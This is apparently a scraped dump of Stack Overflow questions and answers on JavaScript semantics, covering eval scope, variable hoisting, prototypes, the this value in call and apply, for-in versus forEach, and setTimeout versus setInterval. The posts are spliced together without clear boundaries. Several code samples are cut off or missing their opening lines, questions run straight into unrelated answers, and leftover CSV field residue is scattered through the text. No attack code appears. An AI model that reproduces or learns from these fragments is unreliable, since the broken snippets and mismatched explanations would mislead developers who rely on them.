<p>And also the lexical environment:</p>

<pre><code>(function () {
  eval('var localVar = ""test""');
})();

typeof localVar; // should be 'undefined', returns 'string' on the Console
</code></pre>

<p>In the above function <code>localVar</code> should be declared on the lexical environment of the caller, not on the global context.</p>

<p>For <code>FunctionDeclaration</code>s the behavior is completely normal, if we try:</p>

<pre><code>function test1(arg) {
  return eval('arg');
}
test1('foo'); // properly returns 'foo' on the WebKit console

  eval('var localVarTest = ""test""');

<p>The function, as below, takes 2 parameters, dobNum (the value of an input field) and dmy (a switch variable that receives either ‘dd’, ‘mm’ or ‘yyyy’). The function is called as follows with the value of an input field so there shouldn’t be any object based problems:</p>

<p>onblur=”validateDOB(this.value, ‘mm’);</p>

<p>I have spent ages trying to get to the bottom of this and there seems to be a problem with the parseInt() statement.
This works fine for the days and months until you pass either a 08 (zero, eight) or a 09 (zero,nine).  Here the result of the parseInt() returns as 0 rather than an 8 or 9 respectively.<br>
But this is only a problem with 08 and 09, passing numbers 01 to 07 returns 1 to 7 as expected.<br>
Similarly, when passing single digits, 1 to 9, to the function, parseInt() returns the appropriate value as an integer.  </p>

<p>Really struggling to fathom this one out.  Conversely removing the parseInt statement completely seems to work however this leaves the dobNum value as a string which I don’t feel is particularly good practice.</p>

Let me quote this part:</p>

<blockquote>
  <blockquote>
    <p>I don't want to declare the variable to be global</p>
  </blockquote>

<p>I understand your concern, an assignment made to an undeclared identifier may end up creating a property on the global object, moreover with the ECMAScript 5th <a href=""http://dmitrysoshnikov.com/ecmascript/es5-chapter-2-strict-mode/"" rel=""nofollow"">Strict Mode</a>, an undeclared assignment will cause a <code>ReferenceError</code>, breaking your code</p>

<p>Variables in JavaScript are declared <em>before</em> the actual code execution, all occurrences of the <code>var</code> statement are bound to the current <em>Variable Object</em>, and they are initialized with <code>undefined</code>, you can't really <em>declare</em> a variable conditionally.</p>
"
"<p>I've had trouble with people jumping to conclusions about what I need here, so please read this and think about it before answering.</p>

<p>Here is the case:</p>

<p>You have an incoming object. You do not know the structure of this object. You do however have a ""target"" to something in the object. So let's pretend there is <code>myObject</code>, and you have some kind of target defined like an array of association levels:</p>

<pre><code>var objectTarget = [ 'firstLevel', 'secondLevel' ,'targetProperty' ];
</code></pre>

<p>Now the incoming <code>myObject</code> looks like this:</p>

<pre><code>{
    firstLevel: {
        secondLevel: {
            targetProperty: ""The goods!""
        }
    }
}
</code></pre>

<p>But as stated before, you don't know the structure. All you know is what is in the <code>objectTarget</code> array.</p>

<p>My problem is being able to address an arbitrary location within an object based solely off a target. If I knew that the target would <em>always</em> be three levels deep, then I could simply reference it like this:</p>

<pre><code>myObject[objectTarget[1]][objectTarget[2]][objectTarget[3]];
</code></pre>

<p>However, because I cannot be sure of the number of level depth, this is not adequate. The only way I have been able to accomplish this task is choose a maximum number of reasonable levels, and then switch on it. Like so:</p>

<pre><code>switch ( objectTarget.length) {
    case 1:
        var result = myObject[objectTarget[1]];
        break;
    case 2:
        var result = myObject[objectTarget[1]][objectTarget[2]];
        break;
    case 3:
        var result = myObject[objectTarget[1]][objectTarget[2]][objectTarget[3]];
        break;
    case 4:
        var result = myObject[objectTarget[1]][objectTarget[2]][objectTarget[3]][objectTarget[1]];
        break;
}
</code></pre>

<p>..etc</p>

<p>This is obviously extremely messy, and not the optimal solution.</p>

<p>Does this properly explain my problem? Is there a cleaner manner in which to accomplish this?</p>

<p>I wouldn't recommend you to avoid the <code>var</code> keyword, even if you are on Global Code.</p>

<p>The two ways seem similar but actually they are not the same, the first is a <em>Variable Declaration</em>, the <em>Variable Object</em> on global code, is the Global object itself, that's why global variables are accessible as properties of the global object (<code>window.MyNS</code>).</p>

<p>The second one is an <em>undeclared assignment</em>, it creates a property on the global object if the identifier is not found in the scope chain.</p>

<p>There is also another subtle difference between your two examples, the Variable Instantiation creates the property on the global object that is non-deleteable:</p>

<pre><code>var myVar = '';
delete window.myVar; // false
typeof window.myVar; // 'string'
</code></pre>

<p>While the undeclared assignment not:</p>

</code></pre>

<p>The article you link to talks about a change that was introduced in the ECMAScript 5th Edition specification to the <code>call</code> and <code>apply</code> methods.</p>

<p>Those methods allow you to invoke a function passing the first argument as the <code>this</code> value of the invoked function.</p>

<p>On ECMAScript 3, if this argument was <code>undefined</code> or <code>null</code>, the <code>this</code> value of the invoked function will refer to the global object, for example:</p>

<pre><code>function test () {  return this; }
test.call(null) === window; // true
</code></pre>

<p>But that changed in ES5, the value should now be passed without modification and that caused the <code>Object.prototype.toString</code> to throw an exception, because an object argument was expected.</p>

<p>The specification of that method changed, now if the <code>this</code> value refers to <code>undefined</code> or <code>null</code> the string <code>""[object Undefined]""</code> or <code>""[object Null]""</code> will be returned, fixing the problem (thing that I don't think is really good, since both results results feel just wrong, <code>undefined</code> and <code>null</code> are <em>not</em> objects, they are primitives... that made me remember <code>typeof null == 'object'</code>... Moreover I think it messes up with the concept of the <code>[[Class]]</code> internal property, anyway...)</p>

<p>Now you might wonder why jQuery uses this method to check for a function object, instead of using the <code>typeof</code> operator?</p>

<p>Implementation bugs, for example in Chrome/Safari/WebKit, the <code>typeof</code> for RegExp objects returns <code>""function""</code>, because RegExp objects where made <em>callable</em>, e.g.:</p>

<pre><code>typeof /foo/; // ""function"" in Chrome/Safari/WebKit

<p>The <code>typeof</code> operator returns <code>""function""</code> if the object implements the <code>[[Call]]</code> internal property, which made objects to be <em>callable</em>.</p>

<p>what are the differences between $(document).ready(function() vs $(function(){<br>
and should I write it in the $ form or the new jQuery(document).ready(function(){ way?
if I have google api loaded is google.setOnLoadCallback(function() { a better way? or is it the same thing?</p>

<p>I've also seen people use $(function($){
can somebody help me, I'm lost. I bugs me when I don't know the code I write. I guess I should read through the library. Are the all being defined as the same thing?</p>
","5445","","<p>The two ways are equivalent, I personally prefer the second, <code>$(function() {});</code> it's just a <a href=""http://github.com/jquery/jquery/blob/1.4.2/src/core.js#L152"">shortcut</a> for document ready.</p>

<p>About the <code>new jQuery(document)...</code> construct, you don't really need to use the <code>new</code> operator, jQuery will use it internally if you don't.</p>

<p>The argument that the <code>ready</code> handler function receives, is the jQuery object itself.</p>

<p>That's quite useful where you have to run jQuery in compatibility mode with other libraries, for example:</p>

<pre><code>jQuery(function ($) {
  // use $ here
});
</code></pre>

<p>The <code>$</code> argument inside the callback will refer to the jQuery object, outside that function it might refer to another library like PrototypeJS.</p>

"<p>This is my first post on StackOverflow.  This community has provided me with some great insights into lots of different coding questions over the years.  So since I've been stuck on this particular task in JS for days, I decided I'd lean on this great community and see what sort of help I could get on my question.</p>

<p>I saw a pretty good post here that actually was close to what I want (<a href=""http://stackoverflow.com/questions/1479319/simplest-cleanest-way-to-implement-singleton-in-javascript"">post here</a>), but unfortunately I need to create multiple instances of an Object that is within a namespace, which that example doesn't help with.</p>

<p>Here's what I am attempting to do:</p>

<pre><code>if (!myNamespace) {
  var myNamespace = {};
}

// Object for my namesapce
myNamespace.Item = function() { 
    return  {

        Initialize: function(title,details) {   
            // setting members of this Object
            this.title = title;   
            this.details = details;

        },

            this.Position();

        },

        Position: function() {
            // position my item in the DOM          
        },

        Show: function() {
            // show my item in the DOM          
        }
    };
}();    

// another Object for my namesapce
myNamespace.Basket = function()  {  
    return  {       
        Initialize: function(title,details,code) {  
            // setting members of this Object
            this.items = [];   
        },

            this.items[items.length] = item;                
        }
    };
}();

var Item = new myNamespace.Item;  // the code fails to create a new instance of this Object
Item.Initialize(""New Item Title"",""New Item Desc."");
Item.Display();

var Item2 = new myNamespace.Item;  // the code fails to create a new instance of this Object
Item2.Initialize(""New Item Title2"",""New Item Desc. 2"");
Item2.Display();

<p>I'm fairly sure I am thinking of Singleton vs. Class incorrectly.  A nice code example with the correct nesting/structure would help SO much!  THANKS IN ADVANCE!</p>
","5445","","<p>The problem is that <code>myNamespace.Item</code> is not a function, is an object, because you have a function that is immediately executed.</p>

<p>You can for example, add the methods to the current object:</p>

<pre><code>myNamespace.Item = function() { 
  this.initialize = function(title,details,code) {  
    // setting members of this Object
    this.title = title;   
    this.details = details;
    this.code = code;
  };

  this.display = function() {
    this.Position();
    this.Show();    
  };

  this.position = function() {
    // position my item in the DOM          
  };

  this.show = function() {
    // show my item in the DOM          
  }
};
</code></pre>

<p>Or use the <code>prototype</code> property of the constructor function, to make the object instances created with the <code>new</code> operator inherit those methods:</p>

<pre><code>// Object for my namesapce
myNamespace.Item = function() {
  // constructor logic
};    

myNamespace.Item.prototype.initialize = function(title,details,code) {  
  // setting members of this Object
  this.title = title;   
  this.details = details;
  this.code = code;
};

myNamespace.Item.prototype.display = function() {
  this.Position();
  this.Show();    
};

myNamespace.Item.prototype.position = function() {
  // position my item in the DOM          
};

myNamespace.Item.prototype.show = function() {
  // show my item in the DOM          
};
</code></pre>

<p>Or a slightly shorter syntax:</p>

<pre><code>myNamespace.Item = function() { };

myNamespace.Item.prototype = {
  initialize: function(title,details,code) {  
    // setting members of this Object
    this.title = title;   
    this.details = details;
    this.code = code;
  },
  display: function() {
    this.Position();
    this.Show();    
  },
  position: function() {
    // position my item in the DOM          
  },
  show: function() {
    // show my item in the DOM          
  },
  constructor: myNamespace.Item // fix the constructor property
};
</code></pre>

<p>The benefit of using the <code>prototype</code> property is that the methods exist only in the <code>myNamespace.Item.prototype</code> object, while in the first example, each object will have its own function instances which is less memory-efficient.</p>

"<p>this is my code snippet, where the program doesn't enter the foreach loop:</p>

ct[""you""]= {""name"" : ""stack""};
ct.forEach(function (c){
    document.getElementById(""tmp"").appendChild(document.createTextNode(c));

});</code></pre>

<p>Can you help me to implement the solution to iterate over the arrays with all kinds of indices? My aim is to store the values for given date objects.</p>

<hr>

<p>I use the data for the <a href=""http://vis.stanford.edu/protovis/"" rel=""nofollow"">Protovis</a> library and AFAIK it needs an array as input.</p>

<p>The data structure I use in the protovis example is more complicated than this one shown above.</p>

<p>In my project I send via JavaBean the set of some objects. Those object contain among other things the date. My aim is to show those objects on the graph like this, presented on protovis website http:// vis.stanford.edu / protovis/ex/area.html.</p>

<p>I will use the horizontal axis for the time, and the vertical axis for number of objects for a given time. This is why I want to have the array sorted by the date, since AFAIK protovis only allows arrays as the data input for their diagrams in the default mode - function chaining. </p>

<p><strong>edit3</strong> the code above is working now:</p>

<p>In a nutshell: I use the tlk array to reflect the date to the index. For one index in the resultTmp array I store the date and the set of objects related to that date.
The next part of code I use to sort the dates from the oldest to the newest and analogously sort the resultTemp. The sorted version of resultTemp is in the result Array.</p>

<p>I present data in protovis in following way:</p>

<pre><code>
vis.add(pv.Line)
    .data(result)
    .lineWidth(2)
    .left(function(a) x(a.date))
    .bottom(function(a) y(a.docs.length))
    .add(pv.Dot)
    .lineWidth(function(a) a.docs.length - (a.docs.length-1)/3)
    .radius(function(a) a.docs.length * (a.docs.length/1.2))
    .fillStyle(function(a) color(a.docs.length))
    .event(""click"", function(a) Popup.show(a.docs))
    .anchor(""top"").add(pv.Label)
    .text(function(a) a.docs.length)
    .textBaseline(""bottom"");

vis.render();
</code></pre>

<p>The exemplary result looks like: 
i.imgur.com / WODYA.png<br>
I didn't include the code for printing the x and y axes as well as for scaling from the date to the graph width. You can find examples on the protovis examples page.</p>

<p>BTW:
I'm confused why in the part:</p>

<pre><code>for(key in tlk){
    dates[i] = new Date(key);
    i++;
}</code></pre>

<p>As the last key I get ""contains""? Tried to find answer on Internet, without success.
Bears explained in his comment that the reason I get this probelm is because I'm iterating over the properties of the array.</p>
","5445","","<p>The <code>Array.prototype.forEach</code> method traverses the array on its numeric indexes.</p>

<p>Arrays are not 'associative', if you want to have named properties with values you should use a simple object, and use the <code>for-in</code> statement to enumerate the existing properties:</p>

<pre><code>var ct = {};
ct[""me""]= {""name"" : ""Jakub""};
ct[""you""]= {""name"" : ""stack""};

for (var prop in ct) {
  if (ct.hasOwnProperty(prop)) {
    alert(ct[prop]);
  }
}
</code></pre>

<p>The <code>hasOwnProperty</code> method is called because the <code>for-in</code> statement traverse properties that are inherited, in that way it will enumerate only the properties that physically exist on the object (own properties).</p>

<p>You can use <code>if (Object.prototype.hasOwnProperty.call(ct, prop))</code> instead of <code>if (ct.hasOwnProperty(prop))</code> for extra safety, because if the object has a property named ""<code>hasOwnProperty</code>"", will not be the method you want to execute.</p>

<blockquote>
  <p>The most common mistake made when defining the form HTML that a script will interact with follows from the existence of the shortcut accessors for form controls. It is to give the control a NAME (or possibly ID) that corresponds with an existing property of FORM elements. And the most common example of that is an INPUT element of type=""submit"" with the NAME ""submit"". Because the named controls are made available as named properties of the FORM element this INPUT element is made available under the property name ""submit"". Unfortunately FORM elements already have a property with the name ""submit"", it is the submit method that can be used to submit the form with a script.</p>

"<p>I'm a total Javascript newb, and I'm trying to wrap my head around OLN. What I'm encountering is that, when calling an object method from another method on the same object, the value of local value of 'this' in the called method is changing. Here's my code:</p>

<pre><code>var generator = {
    generateForLevelSkillAndCount : function(level, skill, count) {
        var functionCall = this['generate_' + level + '_' + skill];
        return functionCall(count);
    },
    generate_0_4 : function(count) {
        return this.generate_generic_dots(count, 3);
    },
    generate_generic_dots : function(count, maxDots) {
        /* do cool stuff and return it */
    }
};
</code></pre>

<p>So, I call <code>generator.generateForLevelSkillAndCount(0, 4, 20)</code> and it works properly, calling <code>generate_0_4(count)</code>. However, this is where it fails, with Chrome's Javascript console telling me ""Uncaught TypeError: Object [object DOMWindow] has no method 'generate_generic_dots'."" </p>

<p>I know enough to know that the problem is that the value of <code>this</code> in <code>generate_0_4</code> is a DOMWindow object, rather than generator (which is what <code>this</code> is pointing to in <code>generateForSkillLevelAndCount</code> but I can't figure out why that would possibly be happening.</p>

<p><strong>Update:</strong> I updated the example code per CMS's suggestion to get rid of <code>eval</code>, but the same error is being returned, so it's not just an <code>eval</code> bug.</p>
","5445","","<p>First of all, I would encourage you to avoid eval where you don't need it, for example, in your fist function:</p>

<pre><code>//...
generateForLevelSkillAndCount : function(level, skill, count) {
    var functionCall = this['generate_' + level + '_' + skill];
    return functionCall(count);
},
//...
</code></pre>

<p>You can use the bracket notation property accessor instead <code>eval</code>, it's unnecessary in this case.</p>

<p>Now, I guess you are trying your code on the Chrome's Console, and <code>eval</code> is failing because the console has a bug, when <code>eval</code> is invoked from a FunctionExpression (such as <code>generateForLevelSkillAndCount</code>), the evaluated code uses the Global context for its Variable Environment and Lexical Environment.</p>

<p>See <a href=""http://stackoverflow.com/questions/3431689/how-come-eval-doesnt-have-access-to-the-scoped-variables-under-a-with-statement/3431919#3431919"">this answer</a> for more information on this bug.</p>

<p><strong>Edit</strong>: After re-reading your code, the problem happens because you lose the base object reference when you assign the function to your <code>functionCall</code> variable, you can either:</p>

<p>Invoke the function directly, without using that variable:</p>

<pre><code>//...
generateForLevelSkillAndCount : function(level, skill, count) {
    this['generate_' + level + '_' + skill](count);
},
//...
</code></pre>

<p>Or still use your variable, but <a href=""http://stackoverflow.com/questions/3274387/this-object-cant-be-accessed-in-private-javascript-functions-without-a-hack"">persist the <code>this</code> value</a>:</p>

<p>In browser scripting the global object has a property named <code>window</code> which refers to the global object itself, in other environments there is no <code>window</code> property.</p>

<p>In the above example, we have two <em>local identifiers</em> (which are a bit faster to resolve), <code>window</code> and <code>undefined</code>, only the first one is passed (<code>this</code>, which always refers to the global object in <em>Global code</em> (code that is outside of any function)), and the second, will contain the primitive <a href=""http://javascriptweblog.wordpress.com/2010/08/16/understanding-undefined-and-preventing-referenceerrors/""><code>undefined</code></a> value, because we are not passing any value to it.</p>

"<p>Greetings,</p>

<p>After reading the following article I have a question: 
<a href=""https://developer.mozilla.org/en/Introduction_to_Object-Oriented_JavaScript"">https://developer.mozilla.org/en/Introduction_to_Object-Oriented_JavaScript</a></p>

<p>In the inheritance example, the Person constructor doesn't take any parameters. How would this same example look if I were to add one and call it from the Student constructor?</p>

<p>Thanks!</p>
","5445","","<p>Well, a way that you can re-use the logic of the <code>Person</code> constructor is invoking it with <a href=""https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Function/call""><code>call</code></a> or <a href=""https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Function/apply""><code>apply</code></a>, for example:</p>

<pre><code>function Person(gender) {
  this.gender = gender;
}

function Student(gender) {
  Person.apply(this, arguments);
}
Student.prototype = new Person(); // make Student inherit from a Person object
Student.prototype.constructor = Student; // fix constructor property

var foo = new Student('male');
foo.gender;             // ""male""
foo instanceof Student; // true
foo instanceof Person;  // true
</code></pre>

<p>If you want to prevent the execution of the <code>Person</code> constructor when is called without arguments (like in the line: <code>Student.prototype = new Person();</code>), you can detect it, e.g.:</p>

<pre><code>function Person(gender) {
  if (arguments.length == 0) return; // don't do anything
  this.gender = gender;
}
</code></pre>

"<p>I have this on a javascript var: (it's a http returned data, and I don't know if it's an array or string - (how can we see that?) - Update: using typeof returned ""string"", so it's a string.</p>

<pre><code>[{""nomeDominio"":""gggg.fa""},{""nomeDominio"":""rarar.fa""}]
</code></pre>

<p>How can we pass/transform that, into something like this:</p>

<pre><code>[""gggg.fa"",""rarar.fa""]
</code></pre>

<p>?</p>

<p>Thanks a lot,
MEM </p>
","5445","","<p>You can figure out if is a string or an already parsed object by checking the type of your variable, e.g.:</p>

<pre><code>ajax('url', function (response) {
  alert(typeof response);
});
</code></pre>

<p>You will now figure out if it's a <code>""string""</code> or an Array <code>""object""</code>.</p>

<p>If it's a string, you can use the <code>JSON.parse</code> method as @alcuadrado suggest, otherwise you can simply use the array.</p>

<p>Several answers suggest the use of the <code>for-in</code> statement to <em>iterate</em> over the array elements, I would discourage you to use it for that.</p>

<p>The <code>for-in</code> statement should be used to <em>enumerate</em> over object properties, to <em>iterate</em> over Arrays or Array-like objects, use a sequential loop as @Ken Redler suggests.</p>

<p>You should really avoid <code>for-in</code> for this purpose because:</p>

<ul>
<li>The order of enumeration is not guaranteed, properties may not be visited in the numeric order.</li>
<li>Enumerates also inherited properties.</li>
</ul>

<p>You can also use the <a href=""https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Array/map""><code>Array.prototype.map</code></a> method to meet your requirements:</p>

<pre><code>var response = [{""nomeDominio"":""gggg.fa""},{""nomeDominio"":""rarar.fa""}];
var array = response.map(function (item) { return item.nomeDominio; });
// [""gggg.fa"", ""rarar.fa""]

"<p>I'm wondering about access times on object members. More precisely, I'm benchmarking access times on the <code>window</code> object. I believe I can explain most behavior here on my own, but I'd feel better to hear some comments.</p>

<p>Usecase: Different access times on different propertys ?</p>

<p>I'm benchmarking on Firefox 3.6.8 (windows), the simple measuring code looks like:</p>

<pre><code>var loop = 100000;

console.time('bench');
while(loop--){
   if(window.JSON)
      var foo = 0;
}
console.timeEnd('bench');
</code></pre>

<p>The first strange thing is, it makes a different which property I'm looking up. For instance, <code>window.JSON</code> seems to be faster to access, than <code>window.localStorage</code>. There are other propertys/methods which can get accessed even faster.<br>
Since there is no specification or defination within in the the <a href=""http://www.ecma-international.org/publications/standards/Ecma-262.htm"" rel=""nofollow"">ECMA-262 Language Specification</a>, which order keys must have in an object, I guess each browser vendor implements it's own logic in which order <code>keys</code> are stored in memory.<br>
Could this be an explanation for this behavior? Like, <code>JSON</code> is one of the very first keys and <code>location</code> is more at the end? (In my test environment at least)</p>

<p><strong>--</strong></p>

<p>Another thing I noticed is, that calling <code>if(JSON)</code> is slightly faster than <code>if(window.JSON)</code>. If we forget about that you always should do the second call because of possible reference errors, those calls should have the same access time. I'm aware of ECMAscripts behavior on <code>nested member lookups</code> (<strong>A nested member will cause the Javascript engine to go through the object member resolution, each time a dot is encountered</strong>), so <code>window.location.href</code> must be slower than <code>location.href</code>, but in this case.. is there a difference between <code>JSON</code> and <code>window.JSON</code> ?</p>

<p>To end this, the fastest way to know whether or not the <code>window</code> object owns a specific property/method is to use the <code>IN</code> operator. That is about 10 times faster for the above examples.</p>
","5445","","<p>The first strange thing you notice might have to do about how <a href=""http://www.jibbering.com/faq/#hostObject"" rel=""nofollow""><em>host objects</em></a> are implemented by the browser.</p>

<p><code>localStorage</code> is a <em>host object</em>, provided by the environment, <code>JSON</code> on the other hand, is a <a href=""http://www.jibbering.com/faq/#builtInObject"" rel=""nofollow""><em>built-in object</em></a> provided by ECMAScript.</p>

<p>Try to resolve another built-in's and you will get more or less the same results than with <code>JSON</code>.</p>

<p>Now, the difference about <code>JSON</code> vs <code>window.JSON</code>:</p>

<p><code>window</code> is just a property on the global object that points to itself, when you access the <code>window</code> identifier the name resolution process takes place to find it.</p>

<p>Basically referencing:</p>

<pre><code>JSON;
</code></pre>

<p>Involves only one identifier lookup (in the scope chain), and:</p>

<pre><code>window.JSON;
</code></pre>

<p>Involves an identifier lookup (<code>window</code>) and a property lookup (<code>window.JSON</code>).</p>
"
"<p>It seems like this question is asked periodically and the common response is ""You shouldn't do that with AJAX anyway. Just set the window location to the file.""</p>

<p>But I'm trying to request a file that doesn't actually exist out on the server anywhere. It's dynamically generated (by a Django view) given the GET/POST context parameters. The file I want to retrieve via AJAX, and then save to the client machine, is a text file (csv).</p>

<p>I can currently get the text to the client machine (and can verify this by seeing it in logging or an alert) but cannot then figure out how to save this text to a file inside of the AJAX success callback fn.</p>

<p>Essentially, is this possible, is it something JS can do? That is, to open file save dialogs for ""files"" that are actually AJAX response text?</p>
","5445","","<p>As others mentioned, you can't do it only with JavaScript.</p>

<p>IMO the best option would be the Flash 10+ <a href=""http://help.adobe.com/en_US/AS3LCR/Flash_10.0/flash/net/FileReference.html#save%28%29"" rel=""nofollow"">FileReference API</a>.</p>

"<p>Now, I usually call a function (that requires no arguments) with <code>()</code> like this:</p>

<pre><code>myFunction(); //there's empty parens
</code></pre>

<p>Except in jQuery calls where I can get away with:</p>

<pre><code>$('#foo').bind('click', myFunction); //no parens
</code></pre>

<p>Fine. But recently I saw this comment <a href=""http://stackoverflow.com/questions/3640187/how-can-i-modify-pasted-text"">here</a> on SO:</p>

<p>""Consider using <code>setTimeout(monitor, 100);</code> instead of <code>setTimeout('monitor()', 100);</code>. Eval is evil :)""</p>

<p>Yikes! Are we really <code>eval()</code>-ing a string here? I guess I don't really understand the significance and implications of 'calling' a function. What are the real rules about calling and referring to functions?</p>
","5445","","<p>Your jQuery <code>bind</code> example is similar to <code>setTimeout(monitor, 100);</code>, you are passing a reference of a function object as an argument.</p>

<p>Passing a string to the <code>setTimeout</code>/<code>setInterval</code> methods should be avoided for the same reasons you should avoid <code>eval</code> and the <code>Function</code> constructor when it is unnecessary.</p>

<p>The code passed as a string will be evaluated and run in the global execution context, which can give you ""scope issues"", consider the following example:</p>

<pre><code>// a global function
var f = function () {
  alert('global');
};

(function () {
  // a local function
  var f = function() {
    alert('local');
  };

  setTimeout('f()', 100); // will alert ""global""
  setTimeout(f, 100);     // will alert ""local""
})();
</code></pre>

<p>The first <code>setTimeout</code> call in the above example, will execute the global <code>f</code> function, because the evaluated code has no access to the local lexical scope of the anonymous function.</p>

<p>If you pass the reference of a function object to the <code>setTimeout</code> method -like in the second <code>setTimeout</code> call- the exact same function you refer in the current scope will be executed.</p>
"
"<p>Say I have some code:</p>

<blockquote>
<pre><code>setInterval(foo,1000); // here is an interval that causes a function to repeat
</code></pre>
</blockquote>

<pre><code>function foo(){
//a number of lines of code
}
</code></pre>

<p>Now, i think of this as causing <code>foo()</code> to be executed every second by the system clock, whereas this:</p>

<blockquote>
<pre><code>function foo(){
//a number of lines of code
setTimeout(foo,1000);    } //here is a timeout that causes the function to repeat
</code></pre>
</blockquote>

<p>Am I correct in guessing that the latter function would be executed less often in a given period of time, because I'm inserting a pause <em>between</em> executions (which, themselves, take a measurable amount of time)? Any further points or enlightenment on this mechanism would be welcomed.</p>
","5445","","<p>Let me quote an <a href=""http://ejohn.org/blog/how-javascript-timers-work/"" rel=""nofollow"">article</a> about timers by John Resig, which specifically addresses your question:</p>

  setTimeout(arguments.callee, 10);
}, 10);

setInterval(function(){
  /* Some long block of code... */
}, 10);
</code></pre>

<blockquote>
  <p>These two pieces of code may appear to
  be functionally equivalent, at first
  glance, but they are not. Notably the
  setTimeout code will always have at
  least a 10ms delay after the previous
  callback execution (it may end up
  being more, but never less) whereas
  the setInterval will attempt to
  execute a callback every 10ms
  regardless of when the last callback
  was executed.</p>
  
  <p>Intervals may execute back-to-back with no delay if they take long enough to execute (longer than the specified delay).</p>

","5445","","<p>It should give you a <code>TypeError</code> exception -for trying to invoke an object-, the behavior observed in the Firebug's console is not right...</p>

<p><code>FunctionDeclaration</code>'s are <a href=""http://stackoverflow.com/questions/1710424/referencing-a-javascript-value-before-it-is-declared-can-someone-explain-this/1710509#1710509""><em>hoisted</em></a> to the top of their enclosing scope, your code is actually executing in this order:</p>

}

// the var has no observable effect, because
// the randonmane identifier is already defined

</code></pre>

<p>When entering to an execution context, the <a href=""http://bclary.com/2004/11/07/#a-10.1.3"">Variable Instantiation</a> process (aka <a href=""http://ecma262-5.com/ELS5_HTML.htm#Section_10.5"">Declaration Binding Instantiation</a> in ES5) defines the properties on the <a href=""http://bclary.com/2004/11/07/#a-10.1.6"">Activation Object</a> (AO, <em>this is a non-reachable object that holds identifiers of variables, functions declarations and function arguments in the local scope</em>) in the following order:</p>

<ol>
<li><code>FormalParameterList</code> identifiers (for <a href=""http://bclary.com/2004/11/07/#a-10.2.3"">Function Code</a>)</li>
<li><code>FunctionDeclaration</code> identifiers</li>
<li><code>VariableDeclaration</code> identifiers</li>
</ol>

<p>A <code>VariableDeclaration</code> will not overwrite an identifier has been already defined in the AO (e.g. by one of the first two steps), but the assignment will do it at run time.</p>

<p>For example:</p>

<pre><code>(function (foo) {
  var foo; // doesn't affect the existing `foo` identifier
  return typeof foo;
  function foo () {}
})('string'); // yields ""function""
</code></pre>

<p>But if an assignment is made, the value of the identifier will be replaced, for example:</p>

<pre><code>(function (foo) {
  var foo = {};
  return typeof foo;
  function foo () {}
})('string'); // yields ""object""!!
</code></pre>

<p>In the above example, when the function is invoked, -but before the code execution- the <code>foo</code> identifier is set up on the Activation Object (aka Variable Object).</p>

<p>First it gets assigned the value of the formal parameter, the value <code>'string'</code>, then all <code>FunctionDeclaration</code>'s on the Function Body are examined, a function named <code>foo</code> is found, then the <code>foo</code> identifier will point to that function.</p>

<p>After that, all Variable Declarations are examined, we have one with the identifier <code>foo</code>, but its value is respected in this time -remember that the function hasn't been executed-. </p>

<p>At this point, the function is ready to be executed, its lexical and variable environment is setup.</p>

<p>The first thing that will be executed in the function, is the assignment <code>foo = {};</code>, which replaces the reference to the function that we had before.</p>

<p><strong>Why it behaves differently on other browsers and Firefox?</strong></p>

<p>Because:</p>

<ol>
<li>The Firebug's console <a href=""http://www.google.com/codesearch/p?hl=en#BmTejM3fPxA/content/firebug/commandLine.js&amp;l=80"">wraps your code</a> before evaluating it.</li>
<li>The Mozilla implementations define a <a href=""https://developer.mozilla.org/en/JavaScript/Reference/Statements/function"">Function Statement</a></li>
</ol>

<p>Since Firebug evaluates code by wrapping inside a <code>with</code> statement, this causes the <code>FunctionDeclaration</code> to be evaluated in <em>statement context</em> -a Mozilla's Function Statement-.</p>

<p>To show the behavior of the Function statement on Mozilla implementations, consider the following example:</p>

<pre><code>if (true) {
  function foo () { return 'true!';}
} else {
  function foo () { return 'false??!';}
}

foo();
</code></pre>

<p>In Mozilla you will get <code>'true!'</code>, while in other implementations you will get <code>'false??!'</code> - even on IE-.</p>

<p>That's because the function definition was made at run-time, in Statement context (in side the true branch of the <code>if</code>), while in other implementations, the function declarations are evaluated at <em>parse time</em>.</p>

<p>The above example should actually produce a <code>SyntaxError</code> exception on any implementation, but that doesn't happen on any of them...</p>

<p>A <code>FunctionDeclaration</code> should be allowed only, in global code or directly in the FunctionBody of a function.</p>

<p>A <a href=""http://books.google.com/books?id=2weL0iAfrEMC&amp;pg=PT119&amp;dq=%22function+statement%22"">lot of</a> <a href=""http://www.crockford.com/javascript/survey.html"">people</a> use interchangeably the terms Function Declaration and Function Statement but that's totally wrong, ECMAScript doesn't define a Function Statement, is a <a href=""http://www.jibbering.com/faq/#functionStatement"">non-standard feature</a>.</p>

<p>The specification has a brief <a href=""http://www.ecma262-5.com/ELS5_HTML.htm#Section_12"">note</a> on this issue:</p>

<blockquote>
  <p>NOTE: Several widely used implementations of ECMAScript are known to support the use of FunctionDeclaration as a Statement. However there are significant and irreconcilable variations among the implementations in the semantics applied to such FunctionDeclarations. Because of these irreconcilable difference, the use of a FunctionDeclaration as a Statement results in code that is not reliably portable among implementations. It is recommended that ECMAScript implementations either disallow this usage of FunctionDeclaration or issue a warning when such a usage is encountered. Future editions of ECMAScript may define alternative portable means for declaring functions in a Statement context.</p>
</blockquote>

<p>Try to run your code in the global execution context -in a simple <code>&lt;script&gt;</code> element- and you will see it crash also on Firefox:</p>

<pre><code>&lt;script type=""text/javascript""&gt;

<p>Thanks</p>
","5445","","<p>In your example, checking for:</p>

<pre><code>if (map['foo']) {
  //..
}
</code></pre>

<p>Not only checks if the property is not defined on the object, the condition expression of the <code>if</code> statement will evaluate to <code>false</code> also if the property holds a value that coerces to <code>false</code> on boolean context (aka falsy values), such as <code>0</code>, <code>NaN</code>, an empty string, <code>null</code>, <code>undefined</code> and of course <code>false</code>, e.g.:</p>

<pre><code>var map = {
  'foo': 0 // or any other falsy value
}; 

if (map['foo']) {
  // foo is truthy...
} else {
  // foo is falsy or not defined
}
</code></pre>

<p>To check if a <em>property exist</em> on an object, regardless its value -which can be <em>falsy</em>, even <code>undefined</code>- , you can use the <a href=""https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Object/hasOwnProperty"" rel=""nofollow""><code>hasOwnProperty</code></a> method, for example:</p>

<pre><code>var map = {};
map['foo'] = 0;

if (map.hasOwnProperty('foo')) {
  // foo exist physically on the object...
}
</code></pre>

<p>The only problem with this method is that if someone adds a property named <code>hasOwnProperty</code> to an object, it wont work, for example:</p>

<pre><code>var obj = {
